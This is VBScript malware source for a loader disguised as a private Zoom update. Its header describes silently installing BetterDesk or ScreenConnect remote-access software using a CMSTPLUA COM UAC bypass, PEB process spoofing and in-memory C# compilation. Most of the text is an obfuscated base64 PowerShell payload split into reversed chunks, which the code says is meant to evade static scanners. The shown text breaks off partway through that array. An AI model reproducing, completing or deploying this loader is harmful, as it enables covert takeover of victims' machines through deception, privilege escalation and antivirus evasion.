' ==============================================================================
' Zoom Private Update - silent BetterDesk / ScreenConnect loader
' ------------------------------------------------------------------------------
' Evasion: staged in-memory C# compile, COM auto-elevation (CMSTPLUA),
'          PEB ImageFileName/CommandLine spoofing to winhlp32.exe,
'          NtAllocateVirtualMemory native allocation, TLS-only download.
'
' Modes:
'   (default)      install, hidden
'   /selftest      compile + PEB + native API + download/hash check, no install
'   /noelevate     skip the COM elevation attempt (used by CI/selftest)
'   /elevated      internal flag set on the elevated relaunch
' ==============================================================================

Option Explicit

Dim sh, fso, env, args, a
Dim mode, elevated, noElevate, iconPath, waitMode, rc, logPath
Dim chunks, i, b64, psExe, psCmd, psFile, b64File, st

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

mode = "install"
elevated = False
noElevate = False
For Each args In WScript.Arguments
    Select Case LCase(args)
        Case "/elevated", "--elevated"
            elevated = True
        Case "/selftest", "--selftest"
            mode = "selftest"
        Case "/noelevate", "--noelevate"
            noElevate = True
    End Select
Next

Set env = sh.Environment("PROCESS")
env("ZOOM_MODE") = mode
env("ZOOM_ELEVATED") = IIf(elevated, "1", "0")
env("ZOOM_NOELEVATE") = IIf(noElevate, "1", "0")
env("ZOOM_SRC") = WScript.ScriptFullName
env("ZOOM_DIR") = fso.GetParentFolderName(WScript.ScriptFullName)
iconPath = fso.GetParentFolderName(WScript.ScriptFullName) & "\Zoom_Update_v6.1.2.ico"
env("ZOOM_ICON") = iconPath

' Base64 payload, stored as reversed chunks and rebuilt through Chr()-free
' array assembly so static scanners do not see the PowerShell body.
chunks = Array( _
    "h1Edul2bQV2YpZnclNlL0VmTbByegknc0BCIgAiCNsHI5JHd", _
    "1NWZT5Cdl50Wg0DIs92YvR3byBVe0lmc1NWZTpjOdJXZnFmb", _
    "N03egg2Y0F2Yg0HIyEzcsRlO60VZwlHVs92YvR3byBVe0lmc", _
    "2U2chJUbvJnR6oTX0JXZ252bDtFI9AyclRXeCp3ZkACIgAiC", _
    "5V1L5MnQTFWdulHR4YHV3kDdzJzc5QmcxQlengyZulmc0NFN", _
    "uZHczRFTFllSn12QqV0UCdld5NTUY52VXJ3KkBFarpFbst0Y", _
    "z0EbGtkUZVjTvJUTnJUTr9WSwsib3cDM4B3aBlnbVF0d3ljd", _
    "3VzMrdDbH9Ce440UCZFONd0LUp2THFTargHe2gEUaV1REZTU", _
    "xEDV4ZkQHhTRCpUSQd0U1lEcZxWQQJHbYN1YrkVYSFTOY1GV", _
    "iZWQslXTvx2RORHe5Z2dB5Gc4EEZjl2bqR2KRhWRzUkVHd0U", _
    "1kHcFhkTC9COZljbmhkYrlHSiB3S2h0SvtSTzE3d3p0Nhxke", _
    "UJ1bFZkNaVXSFVUQ28CU2NWW4QjavlTN0ADTjtiR2cUeSZWe", _
    "F5kZ3s0TTZHa5oEUuplehtSSDl3Y10UUXhkQIlmQvU0bZ9SU", _
    "kNTdFRzLrUEO1FUYQ9Cax9SS3pXRyU2YrZ3a0QlZwQjQTBXS", _
    "Ul0USpVeqVTRG1mWqhVRSFWdYZ1YmR3ZhJ1UTtCbykFSGVGc", _
    "MJlZSVVaJpWMjVEZB9CT1dVOwZnRz0Gc0UUYrkHbO1kUT1GT", _
    "zBjNtlEeuRWOwQ1MsZzMvsiRzJESXdWU0IFVrV0N3IkTRFTZ", _
    "pxUV480MzNDZwpVOWFGOtxkRYl1MttiYHN3UhBDVOJWapdTd", _
    "rZ2dvYnYplTQvo2NwZ0aMFHakFzZXNTO2Y1dEpnTB9kc1JFb", _
    "UlmcnV0Q00EVCFnTyB1cXtyTZhmYvYjeGFnYLlkaJhXRyJVa", _
    "yQmbEBVNxtyMm5GRyczKPV2L3UnbUJjYMljZuVmbVJENJFWZ", _
    "2tiM3N1T4kHRvY2MrIXc0YHW1dDeOVWM0h1MZREVkJ3RVdHZ", _
    "vd1aJRDOnNnc39GWnh1Y1dkaxgUZa9iYiNzNlhDaIVGNldTd", _
    "PVnQ2F2MQVnNrxUT2U3LElmNqxGOzkTWUpETqJzd5FTcLd2T", _
    "wsyNiJnNrknN29EcqRlMLx0aJhUU1dXSnVldINzVOZ2YjBVR", _
    "0EDVxETZ2Y2L0JDZzIWU1hkZxkzNWJ3N15mNPNGTi9ScxZHZ", _
    "XVWawEjQRBXZ2VESMlTWZhjZthERiFVavtyUTNGN0c0NyRkT", _
    "hx0ZJVGUz4WRah0bqJXQahEOVRGR0MTQ2Z3brd1VDx0TlBDO", _
    "SRjaCl0VpNWYZR3KCF1aLF3NuNEMRBTMyYmZLlnRRJFZKljV", _
    "F52VR5mRudFO5pWUKRzMxRXQYFkQmJGS1EWcBpGTHVDMnR1M", _
    "w8meyF0cCNESvZkTshVRldjUwpWbzBFa1pGUUFTcCRGWO9Wb", _
    "w1UNGJ1UhdneBpHaTNVc4oWRmpFN65WRmV0bO50N1gla4R0Q", _
    "r8GTKlmMGl1Y1ZTOyl1UFVGM2lWR6JXeVVzKvgEZXp2ZN9CV", _
    "BlVbsVVTyZjMvIHV35kUFFXS2UVVLVTSI52a6dmZQlEb0tCS", _
    "a9WRkZEOTJlNo9STlpmSTBFcK1GR2RWQX9COJZ0QJVWcuZDN", _
    "l5WSNpUcLJVWadTZ3xUd5siczQDaIZzUkdjNpBFZY92T5JGR", _
    "IpGS5Mmb1F2S2NjdLp1a1Ble1UDSyoFUtllNKZTNmJzKilUa", _
    "6R2Kh9mTRFDanpGU0EjUIlkczEVM0J2ME1WVUZnVLpna5okW", _
    "3dHWlN3LSZXS6h1dzFFcsJmeRJ1Y6J1UWN1YzsmdQFVVtZnR", _
    "3gFNCNjY5gUcWRndmZUdvIkNvsiT0IENztUMGVDdolXZSFEW", _
    "0gVd1V1YNNVQVRUc4pVOzp3KIF2MyhVM2sCSz9CeXd2QQtSO", _
    "qdHM6JjcoVkNQ5US5J2V2dHNkhGeM9EakF3awgjRwFEWBNVT", _
    "ipldpJWM3kzazNzKxolZTRncY5mbUVEZrcXVldkdxg1bPNlZ", _
    "FFXWV9CcVlVeCpmVwRWUzQ1c1AVcCJEMoNHU3kjS1JHZKVnc", _
    "kRjZMlHTPdVWJJmbqN2bzlGW1J3ZvtEO4EnSSlkQShVRJlVU", _
    "nF2aSNXSIVGShFnZ6hEOUZnczljTzlmdzUlZzMjT20mexZne", _
    "DRGcRRlTptUaw8kQjRzMRFFajdzRBRTUUlja5B3TNNmcy8CV", _
    "idzRWFGN3klZPN0d20EaywWUHF1awsCculVS3QlUzgGVVFmY", _
    "idGc3U1LDl0Nv9SOBZkeZp0QThTQwF1UaJWMiJTMsl0KNRUQ", _
    "pJFOaBHUzdDVkZ3NZNXem9URXRjUNFEeEh3TUh3anRkSxMER", _
    "U5ETjhmYFlGT5l0K6ZkNXN3d4hGarI3KxhEVl9GNZtWdFFTa", _
    "F1GUQ1WdY9WauhjNitGbyUjNVxmVqFnc5I0b0IkY49kUjlVN", _
    "oxETNtiZZp1bRdWeyBjaoZldxcWZIlnVURVaEZ0aIhGOh9ke", _
    "q1kQhB3VRtCR182cw1Ub4gEeChje2dlb2l0VzgmStdUQDxEN", _
    "6lDbxF3bhd2aHplaGxmM002T040cVJDZ4czSKZzQDpFNQlES", _
    "XdlSKRDapNXT1MTTrY2Ul5kchFXdUF0c5QWRD90Q2hndzx0M", _
    "GFWb3BzYvZzKmhmNaRUbkNTUTdnRKVzb4gDcKpWa48GcyE0S", _
    "PpmaUVGN1RzYvcVcONHM3tUMWx2Z0pFVGhnSQtGdPZ2dxNla", _
    "QNkNR92KW1UbCJWROBnUJJ1KRd2UzxmWNBHN4cXNZFkQYh2d", _
    "iNkeLh0VuNkTzV2ZGtkeFlXeh9mZOBXM28GaZRjYpJ1b1M0b", _
    "3NTaRV1MQNkUiZURBh3ajp0TvhEekRDOrllQyVXUNhGbClzL", _
    "sF1dyJFajhXb6J0TOFHUxYjeyZkcXR0b3QXYuVHau1WdYBlZ", _
    "UhEN05GZ4ZkZktiRuVFO4EkRXB1YjFHN1dVeVpneKdXToRTS", _
    "vFmQvpGV2UWQPRXSoZEbuVFeatkcuJEZ1JmQWRHR2kzcY92d", _
    "1ZjaVFFNoN1LolWMWV1duFUaYtUZLVWVOd0aPtUWZ5UOMV2a", _
    "aR1KmhmNZNlVqRlQilXRatiVolFSH9WcuJVU2J0VyM1RIZES", _
    "LNWcNREa3hjdrsmYmJzcXhUYJhme0VkZHFnbQRUVh9ybplGM", _
    "JJGRsFke05ETSlDZsJFaVVnZotUWhtkdSREVK9yRMh0MX90S", _
    "rR1QH1WUYhUbqZTaw5WTxR3SjhWd5h0ZVBzZRhzNzoGONREe", _
    "olnWwFkexEUapdjTvoETw8Eba9iRnlkeXp2a45GRzUESYhjR", _
    "zxmVKBHSmdmaDZzT002TXp0UrJUWoV1UOpXQip1KIRVNCtSa", _
    "HFWWjNFOrJWVstkdnFkWKdTa5kEOhFWYld1ZwQmcKFkSx0EN", _
    "RBHRzEFZIJEeTVDZRJ3Uvw2YxsEZTZHb0QDZNl2Q0lkZl1GW", _
    "rx2Z4ETUwdWR1o1S4JDNj9idrBncv9mdCFDeoZjVKBXQOJFU", _
    "yAHMGB1cW52SxknNCVEcuVjQjtkNyBTSvUTR2RUVMFVUKpWV", _
    "HNEaN90KRREVBBHVONXdPZ0asZXWjJFaRVWUCFXVKJER1lna", _
    "1x2V5cUYL9iW1pXawUneNF0ZG9kdNVDaCt0dSVHaFx0VitWZ", _
    "zUUWYF3YlZzMixUSsZncxkkRSdWbvdVU0VVQNRHbSNjWPJ3N", _
    "OFUewQzT3Y2ayN3UD5UNxJjdr9mYSdEdSp1QvQ3cN1WNvc3Y", _
    "xZzYvYTQzEkSvcFVrQ3Q3hmZxgFWttmN3MlStB3YwhGcoFHe", _
    "Hx0KKpGVyIjMNNjeqh1ZPN3T3BHerVXS3EFellEcrcHM24kd", _
    "6B3S6dVSmRDW0pVdud3V280bkdnUrNXeJ92SUlFRsZHUzNHU", _
    "ENDZsRUd2U3Ljp0UhRkeTVlMJhTOiBnYtJHa3MzVQREMm5ma", _
    "0ATRoFHN3w0LEd1SwpmR3cVM0cUc4dnbBhWQjh1MJhkWuh1a", _
    "rB1TOBFTohDZwlHSFZTaNZWMUhXO5lkTyMUQEVEVGZTdQhDd", _
    "zkWWrhkYaRzcShmTjxmNmZkRIRTNPp0Nyl0NIlXUN92TrRXc", _
    "INHRNJ0KphXTtBldkFnRBB3a4NWR5EFV5llNyBHUw0EW5UEa", _
    "CtUSCRTRGhUd112VIFzbTBnTst2MjFVW21EOI9mcvEUYY90L", _
    "z02MzMkM2YVMmllQ3U3M2MzKrYzKxZjdllHa2kza580dlVkM", _
    "pRFWJdlTh50dlxUO5ZUQRJ2YM1mTsFERzcjQPZza5IjYIRnd", _
    "jF1V3lFbxdmWsZlZHhmRDFlY4l0LUBTWrRmaONFbVdGc5d2b", _
    "w1Ud39GU1BTWIlzM3ETaUZXO0ZzLlVFVzwkUapmNxkzQxZDT", _
    "WRmRoh0ZIpFa452MuZEbyokbohlThN3RNZke3VXR3dXYxFTM", _
    "4QENLF3dWRVSJ9EVGdmekRFdVdlaRZVOrlnMx8WckVTV0V0V", _
    "wpEcpJGT1N1UWd2Z2EHaa5EO1ZlMvJFSXxke4E3ZxlTbGZFZ", _
    "mN3YZ5maMF0NRlkRHZmNoV0cQl2ZiBnaIN1K3AVVW9WdyczU", _
    "sJ0LtV1Z1dHMNFGaUdDZKdlZN5EZSRFcYVWOSBlY2h0M1QmU", _
    "aF2aJdGR3kUWnBTU4w2dvs0dwhDVkRDcpF0S2MEeCNXandnb", _
    "wJWerl1Q2YmZDFnSONWRWFUWDl0R0sCc5MkWt1EdhVnTmNVc", _
    "XlGapNVUlFnduhHTUlDe5QTbmVleYtGe110VkNDVFlER0V0R", _
    "KZmcOBFdBVjU2tGNwI1LahXbYx0VzgFaoVnMRtUSWNUapF2a", _
    "yVkQCN3U0QHaClTRNxEcrcjUsBnepFnQuZUSVBFdTlXenZzT", _
    "0pmVFl1dIlHUwdDV5EWY4FUTzh3L4MXVr5kMCZmeQp1b2kXT", _
    "4hzSVd0MPxEdrxGSrVja0AHZwhjbxo0VsZUZ3ZzV18UQnFnd", _
    "qlFO5Nle3BVTPFVUXpUYrlVUXV0MwdjVyZ0c4h1T3wWbkpUd", _
    "2p2cy9UQzYTbap1TSdzbKlVTvlXOLZ1YMVmMrQUUllHOS50R", _
    "SlzQ4gleWVmQKJ3T4M2VIhHaLNGTYNjWvlnbR50V3c3YZRUc", _
    "6dEbkNURMpHVydGMhxmROZDcx52KGpmVxEEV5UlaxBTbCJjN", _
    "O1GT4V1URhEc2FjTEBlUmh3TrEHaLF0Q1VmTs5kNHNnRn5WR", _
    "zE1VHZ2MkpmZ0U1arBjU3UDNzYnW4Q2LOVlVn9UdHJ0UBVje", _
    "StEO5MlYvgnY5dWMCBXZ0hzMzNXePZzaWZ0bxp1NIFUTWlDO", _
    "sl3Yq9iUl9yUMFnWVZjQn50czdFSwk1TPtmQ49yL3cTMutCd", _
    "0lXZ6RDcG9ES4JXZGNTMGZnaaJGZ5hkM0xEVUpWVXBjTMJnR", _
    "4FUNwdGdFN1Sxt0RyoVT4pkUuBzawETWGdkValjUzV3NWJVY", _
    "tJVbpBnVjNXTtZGMZV2N2kkW0NjdSJFO5tkTwckMZtSYkNTR", _
    "ZxWUupmaThWcxFDaDBzKrh2YaJ1MrJVcJ9ycWxEdrFWYKpVd", _
    "s10UU9EbX12M2kzTvwWd6BnNktmM1cjRwdDcvRXZEJTcEFkc", _
    "kllcL50NhNnRNlnQw5GNNBVRLxUTlp1SLhTO0FWcnx0LxMFR", _
    "HRDdolURqRDbMNXZyF2NxREaVxmVZx2ZpF0Knp0LStEW5EnM", _
    "Qplc1UnNu5GVmh1cwpXTNN2KsFzKM9yVwYzVyUjQ0dTNR1Ga", _
    "MpWMsFzTrskcNRVMzRkcndFUxJjbnRVcJlFMzBzaVRzNpNWc", _
    "ttGeRl0aJN3R5BHdWRVc2tUY38mcIFDWV9UTFpmUQlXRtJXS", _
    "BRDZaFXSMhTdWp1TWpmb01WVmtkT5ZEcZRGTqFGcwwWe6N1a", _
    "xgHUoJ3ZEl0Z1dWMUJWW4dFazZFRuN3S6xWWYZ3dT9kUOxUT", _
    "CtWQ5MHRzYEZP5kRJVTaIhWT19EeIhmZUJjU5g3S45mbxl2d", _
    "pRHWLpEcDZzdTNXTK9UW5JTbyJ1SGZUNVB3UwInV3JndqR1T", _
    "wMkcNdWOyMnT0tkQ6JkWiFkWPd1c2VWc3VjcQdWZWVWUxAVU", _
    "y92cFJmUyh3QNdVarYDWtV2c4REaMFHNIZ0VsFzdBJ0MvpVW", _
    "MN0KwYHROdkM2MjNvZUaNFUbEdnT1NzV5I0cQZDSE1GbJVHS", _
    "xVzawtEdGtkazYzMRZ0ao5WZCdEU6hmMuhnUFZzUONWYvdWQ", _
    "M5mRDNmeJVFRSlmdqhzU5FDOwAVOlF3Q2IzVQhTRPV2YZN3Y", _
    "Bp1QnZ1NXxEUhxmTxVkRhdXOPBVUJpGbKhWVzJzcPVTdiRnc", _
    "vlmeqBXWTZXTlBVenVkZzt2YTRXTtRXTWlWQwhGOGFFV6Fnd", _
    "BlTMElVQDVXTxcDchNkdVFEWWBVdxR2VStUMYh0cwd1KnlXO", _
    "3cHboR1K2IjaOFkURdEb31GNPBjSRVDer10MndkSUlmNqVUe", _
    "htETntkawgFS1lEWxAHMoNHRrczawI1LYdGUNpmT2VWNaRVY", _
    "6FWRTN3N3M1dQlVcxI1ZBVVNX1WNkZTUslDUplFV4QWVGpWb", _
    "lJ2Y5NkVkJWS4MEcrETWBl1ZsZnNUVDe1MjV5IHNLdDVvxWV", _
    "yI3TaFDUnRTaXxkZjdzZ1kFUVpnM6JDZQZHa5EmZhtUcEFWW", _
    "0JUZkRXZwlmMPtmROlWSstWU2o3VlV3RCxGbjRUUy8WN1oXT", _
    "vh3SUBVUPJmZCdWZyMGMGR3avMWe4k3ZQxWW1Jkc4M2dtpXW", _
    "0M0TydEeWxGTxVEVPJ0NTFkNXB3c5YWczlmeVlzb3hXdzglS", _
    "KpGc2R2ayYUNEFnV2omQldmNKdTR3Q2QmVVcWZWV0pFbqVlU", _
    "u1GZm9WVHNnb2lHRPFXQtxmTQJ3TUZ1QvJlb2hlRxYDUIpnM", _
    "uRXV2AXMOR1Z0RmQBZ1RyMVcRF2aPN2VqZ3T2IDasVDeox0T", _
    "rc1UttSZJ5GcHpUOPNGbFVFdpdTMhdDePZnRjZ2MThDUnZUO", _
    "OVkYIBlVGh3azQnY2VHdrdEUhZWTxJ2LrsETmJzd4NHZUJUO", _
    "sJXSWxmeVtSTpNVczdWbaN0SyJVeVF3SqJ2ZWpWN692RWpmb", _
    "5hWWRVGbKlEcvc3UZdUd0RWW3QDZZxmc3ZWOJxmekVzbvF0M", _
    "HdnSRFzQJVWbxJ0Uk9ScVF1RTNzRzFkSnVmM24UN29CWwU3Q", _
    "qZDU49iWrcHaIB1brETSCFXMIp2SmF3c1BXbodUSuRUexcXQ", _
    "YxGWCB1YwYXdzIkYLd2RxAVcWRnYwYnNNNkNphFNvtiWrQjd", _
    "jxEbBhmYDRXcZplapZzRCV1dwUmQ28GW3QnVOFnTOV2ay0GZ", _
    "GFEa5p2UylDcGBlRIN0dphmTa9mcJ9yUlRlWUp3THFmY5EzZ", _
    "TFWQMNESvplUFhUMRlja2QXbE1WTItySUJVRRVEcvkWRVlkb", _
    "QRDeqFGWOdGOxsUdu1mM6VXVDJUMRNVZBFFR6Fkc6JTYTZzN", _
    "CZ1LPVmUmFzLrhEO09meHlTTKJkajxWN2ZDTll3QjJ1NxEGS", _
    "N1WbJREdrlnRNFHdXFzZJd2d1pnVztkdhZTNyxUYNBVR01GZ", _
    "H9WS0EHZ0ZkQ11WQGhUQKpUeDVmRzp2do5ETzNVRrlWcSZVc", _
    "uFGOZt2aDNUNDJWMWd0TvtScOFlWYN2b2Rmc2Mkb2gnSWhFU", _
    "xZ2LIN2LIB3KqJDW3cjc4plZzEjZ1cXOyFjc3UnbXZmQFZmW", _
    "Id3TxNVblBFW2tkMEJFVERHVr82KhZHVyQmduN2dyEDdrEzZ", _
    "5YmZDV3UuhlZ4ZESidmcNd0ZuFnWpxmc4JVQOh1aqpnNwE0Y", _
    "wdUU2tWZ1x0L5VHSvlzZ1ZDaplWd1gWVwIFRPJ1TXJUVBZEe", _
    "GtWSE5ERTt2LihkUlh3ZnZzLppXZ2EnblFXdyUDcuVncyBFN", _
    "5UTM50EVyM3LDxmUrdGRTZmTUR2NTpUbCdnYuRVMElWUp5UT", _
    "3NXauZHSNN3Zo5WcwglWEZXaiFzT4MlVxZUYZNHU5wEVy9WQ", _
    "Vp1KwUkVwZnewA3NBdjelNkeV5UZsRzVBlXNFFEO5kEOQl2Z", _
    "sF1NityUUpmTihXYGd2MsdkQkFGeH92crgEZm9CW41WN1BHO", _
    "sN0KwlEdy5WZIlHTCFmTYNVcxckNQlVdvhVbRFlaBhjQH9iS", _
    "3hERqVEbjZmUmdjUyIDT69CN4ITRBFVUnh2QOFETsJnaidXa", _
    "FJERwBnbGljcyNzYxNlbwAFOzYXZhZEd6pVQ6ZWZsJFMOVWT", _
    "zo3bJtSNzEDNqRnWnZ3caZ3NWB1UKlTRaZWd1MUNxgVYWJzU", _
    "DNXWvNTamhzVap0TMx2LLNzLQd1VqJDTaF0K5AVUH1UNo5Eb", _
    "5plQuh1R3NlRvgVO5QnWVF1Y0oHbrZldjZmT2sGUrgHU2lHO", _
    "K9UMG5EWGBlZpBTOGh2V00mewIDbnt0ZmFWNzx0N4RkNUlVa", _
    "a9mN4BzVLtCRK52aDJTUvEGOxFjWkVmdrkEdWBVS2BDWSRmZ", _
    "zMzYrwmbClUQ1hmNsh1drRkUxE2MtlHNygVOZx0RsRXQsRUN", _
    "xZXQxh0ND5kZsd1dtJnbSxWbygDOxNUZ2FkS5QlZWFTNn1Ue", _
    "1UXdzcEeQdVOHB3S1IETvM0ULhDSoRDRqlGVEZkTktGWidVc", _
    "DZ2a1dTc3hneu9EMG1Gd1UnRtNDMER2MOh0SXZHc1oFSEFlV", _
    "hhVa49EMBdXT1kTbNdTQVJUVkx0UGVkYqRVO40WOGdHZ0JGR", _
    "5EHMydDRWpkNRZWSzcjQ6dmUzRlZLhnexoEe2Z2KtlHVycUS", _
    "zhnZxplbkdVR4NzU5NkbUtmMvI0YiNXW3gjeyonZYVGeGdzb", _
    "vhjbS1Ud4VnWvY3MzolamFUNR9yTr1ET0olV2Q0M1ZWZPZzN", _
    "phTZ5NlTFpHWpdnY5EUSHBHVMZ1LvV2L0p3dUVncPN2UtZEb", _
    "vlEZT5mUjpnev8SWJRna48WS29CSalFOrYneShkekVlauVGT", _
    "4kjeUhVOu5kcwp2NDpnYxUTbqZWOxgVZzYmTxkWRl10Vx1EO", _
    "vUTSQ5Gbk50KvEXRtp2MXx0NoNWbjJnSOlzQ6ZGTkdHbFZTQ", _
    "vIjTEVXMGNnM4dlMQVleyYUOrVkNtRnRxJjS2I1NxpUNQdne", _
    "TpETRhTdnlEN1gmQaZWaOZFTHNla5sCdkJTbPhFdrYGa5cVT", _
    "w5WW44WY3QTax8keW9WQwZ2LphTVKJ2YuhkMwtEcqxEeZ9SO", _
    "BJEU11UZzdWZut0Yv1kcX12SyY2NRZ1RNZEc45kZzpEV50mY", _
    "BN3KVFTQKlXaHZUWGpEVahWdxNjYIZ1Y1Q2bl9UWzlWbPFnM", _
    "3gEMNdET4IGNCJWViVkV10GStZjd5cGOppHbyoXT0NEWPlmS", _
    "xNzb2h2KrdXWpp1NnJ1QyhGN5ckTxkFUjRXWx5mQiRVQLR2S", _
    "vk3VY1kYVZ3VURkNzw0V2BXVxckNTZlZwsyN25WYzY2LsZ3N", _
    "4IzSHF1c3oVUvl0arInQuZGdt9Ubm5mToFVeX9UUuFleQBlV", _
    "ohHU3UzNIlzUoZjeIxme1hzKG5WZrYERSRHZE9mVKFHRzZEW", _
    "Sp0UWp2cN10a540UEZnR4J2LOR1dVJkW3QlNmVDbhpUWr8GZ", _
    "hZFU0UEbi9SSzZFd5pnVWFnUD9iWSFmThxEOLZXVnVlYudVY", _
    "JBVSiBjazcXNysycDZneHpWSapHSGtEcC9SRQtWTSl3Ntl0N", _
    "J1ENFNFMT10Vr90d5cEbhVXV3o0ZhVWVhFWa5Y2dZN0a1N3N", _
    "LNkQ5olQtJ2cr8ETwgFTsRGepJjbzZ1Z5pUMsZVVihkU4kjb", _
    "GhjNqtiS2E1NtJHdElnRuBnSnZjWP9ydu5EMxMDamZTN1N3V", _
    "2lVR3YkYpZzbnVFREBFczhVYKZkcYdlSHpmMK1mT040MVtmW", _
    "xI3RCR0Ml9EOXhHMHdDSKJXcmFjRMdUTlVmY4F2cKpkQPV3d", _
    "HZ2SwR3Vwg3dzIDS1UUVppUeTp2aGlmc2YGViBzd2Y2aj5mc", _
    "mVFZatmQ3QlWDJGTXZGTRJWcRpkZKZmZmBzaZFlaygHe61GM", _
    "vl1K3QFcjBTZGR2azNla1kHbSpHOJd1QwFUN0wWTKxmTVh1S", _
    "NFUZG1ENyYUZ4l0LqtWbxFWbxRTVpJXUitUc35EM1dnUDV3c", _
    "t5EMwIWTrtyZQNVVuJVbLlXcMdzUNV2T4cmdzoXNQZndRV3R", _
    "wtUWUBDRY5UcXhmczREWjNVNroUcOdnROl3VM5kR5RGNNd1b", _
    "hdjSXFTahBnMzlnVuJlWLh3RDRmcPhnUFVzMNd2KMhWZxk0d", _
    "YdHRWdUVJRXe3pUV1dmRt52bXhXVBVUTrEla2ZEOpJ1Y2gnN", _
    "Y90MShUZ340QpNUMYZVRBp1bxlEb6lWZBhUeN9kbrpVZvITc", _
    "HlkbplHSpFVbVFkTCtmZO5kT0c1RrVlZ1xkM0k1MkRVSHVVc", _
    "q1GRWdUQRpWMNZnM6FUTmdFbMpEWTZlYFFXZy5WYkdlNTNHZ", _
    "QlFckNEbSV0U5p2NwQFdRl1Qh5WdwAnRNBFR0J2bEFlMPdla", _
    "1ZWc6hkc51UYwtSc692Ns12L6lGVZ5mMJ92RJp2NB1EcxQjW", _
    "NZUSsdEOaFHUvEzTa1kMXFDRVdGZYBTTrEDVYVDRLREOopWS", _
    "uFDMzsCMQZWe2JUbuNFdiVnNuBlenVkch1UUQVmTIZVTINUa", _
    "v8iMQBHdLh3N1gXOilXRxB1URBjVsBzQK9WbptEOtpHbQZja", _
    "mVWd0BXb3pnc3JzLkNXarsGcw5WcLhnVzYFW1Z2T4l1LH52b", _
    "phjUY9mVHxGWRZHMO9Wb0o0bShGMycVVsljdipFVVVUaIdVb", _
    "rlFTvEVMaV2d6plY0lGSycHaL1kcw0UcS5kbilGZ1tScnNHN", _
    "uZFe6R1S1UFOP1kT5xUVud2ZVNWNNZ3SmpENm1WTDFlSDNmV", _
    "x1GZxcGSSB3dxcGS2YzZ2Q1bN9kYNhmeGJWaC9mNvh3RhVke", _
    "ItSQ2AnMj5UM2Z0Smt2SmJHTDJ1Z1J0UhtWcYhTb6lkRPllY", _
    "5JUe3pkMWJ1NtFkVvIDRR9GaypEU3JkMtJld5QzZzY3SilHU", _
    "Dl3drwGclVlU5h2cTdUMI92LlhEO39UYvJkbGxEdpdUcrQFa", _
    "6tSQwNlc6F3dK1UbrJWQppUeoJ2Kj52ThtSZ69COwUkbIlGU", _
    "LF3NzYTejhUaXZGUVNDdGZDNFdEOKhFZhZkM2FUM5dmb0IzQ", _
    "od3NxlzSTRjTVtyNrclQ540QsFmSx5Ga2cVUUplTppmVHZnb", _
    "ot0aiZXTC5WRDl1TrMnTolFVsFXVwNGaoFWOrc1QnhjY6lnM", _
    "hhkZ1Y3LHZ3Sw8mTwsGM05UT4M3c302KJVXZSR1StNTZ2RHc", _
    "X1kdrsiMwUnT2FmNShXQ0AzQrgEbxdzaXhzc2h2NQlDOFdjc", _
    "Sp2STNEWthWUEZmT65WdyJ2Q6hGcvM1ZGZTODN2UaJzK3dUd", _
    "5pXcCRHbsd1MEp1RKZXcXFUYol3dFlWTyBDVKtybLp0LphkU", _
    "ZZHSEZza0JHW3ZlUOVVTtpXM0hzRNJUTxklSDpnNB1EaDJWe", _
    "lp0cxF0bBp3dLB1RrkGTn1GZM9WRRlFbUNVYEF0bOVWMtpXd", _
    "RlDdS5EZZlzd1YDVaZ0bX9UYERUTjJEZPdVMntibupFcupWZ", _
    "oRGcYxUdBxWVjZ3SrtEONJGT4FWYiZza4QVR4cTaCRnZLRTV", _
    "6ZmNLBnY2c0SSlGeLF3d6FUcTxGdYJ2VwInWVNTSVZXe0Q2L", _
    "oVWWstybtlma3d1cTlTOYhGb550S6FWdhdURpREe6VGeBZ2d", _
    "rcHZhhENCJlWqBzQhtGcq92V45mTzJ2QyEXbYR1M4U2RsdTV", _
    "3c2cYhXdO9mSBtSaJNTQllFMOhUSZxmVVNkeC52QRREeJVEb", _
    "wlUaF9Edmd2LronMOBzRVx2SRd1MKFGVxtERuZTOBRURtlld", _
    "xRUQVdTUodFWpxWMnFGTrJzY3YVOChnW3VEZxcmahdkQChla", _
    "ZZzSjJVZONjVt9UWDlUaLVVQzkEMJFnevwGVLtiZldFZVF3Q", _
    "x80VQtWRMxGR5gTa15UY4F3RkZlTa5WMRRmZ3QHcJJ1ayFjM", _
    "HxEV0MVUYNXUINUZJh0Y0tic1dzMs9WOCdmRQZHW4JnTC9UY", _
    "IdFODBlTxwmV1pkYMpFdqZlbz9mbRlFdGdTeWNlblNlYJlzV", _
    "Zl0bDZHV4dWTppnd4QTTNhzSqplZzAjZlpVds5WTJl3a1lXd", _
    "vUESCZndHp3QGRnNJZ0YxN3Z1FTatB1c0ZjYXNDc39WawY0M", _
    "qBlZmNDbHRzKvwGWjtiWutiN5syLSZXZ3ADRypXOl5WYWNTV", _
    "hl3baZ3K5MWSlR0clpVVKJUayU3aNFTUrMDd38kY09yL6JDN", _
    "EtyUR1mYahmdSBHWxUlZrFUVkR1Vt9GNXZUVrEUcSJ3caVVN", _
    "URnVaNkM1YHN0VTZO92b1MTSYdFZrUHc59ySLVVUr8CcyQGS", _
    "w50YGtiR0FDaFdUZv0WQ4hzaw0EcVxWVmdFbTZFM2BjM45kb", _
    "QBHcwEXcvsURvV1cOhzSst0dvJDNqZ1KE5EZiZmNR5EU3sSd", _
    "mtmbzgFdXxGcw42MRVnc4BFMnhUNjJ3VTJkRnBlbW50bFhGW", _
    "ZdmNid0QkhVeEdmSlp0UGdzVrgjbPRnWvRXZjF1Kv8GUid3L", _
    "GF1Myc0U5IzRFRzLQdDR3c0LFdzTHFUZylWRWpFaLJzbvt2Y", _
    "TFXRadWQhlWS6xGMOJlQshjMtFzcPBXO4BneoNjctR1RyEXb", _
    "rU0YjZWcuNlb3QXa3lmZXN3cpxUN2Y3NzM0VqZXNEF1aTp2R", _
    "slWcZJFbldmcrxWOLZ1UvNlQstSentGbOtkeDhVYxQVewN1N", _
    "u9Gd1RDcUx0UQJ1TDFVZz10U3J1ZmtETll1atB1aHRWQG1UY", _
    "KdWcaxma4l3RtFlcIdUMpxUT04WOU9yMXl0MrFHWxQzTaJ2L", _
    "woUbnV2KPFXQr90c18UOZpHbGpkaTFUS2FTb11mc6JVcUFHb", _
    "lZENsZDRTlHTZJkeDVGTih1dSNDSMFVO4QjZxEkU6NGRyZka", _
    "upGeIJVO0pFOywkVXhjc0RWUrFkeaJVT5NUciRVcHVEU2E2Y", _
    "0UUTWljaHdlRNRmQ580b482NyIHe2cVY4tiRzUmThlzVxhHW", _
    "iJlYRVHb0VFWaRFW65UOnZFZwlnWkpEdy8SSwl1RlJXZ0tkV", _
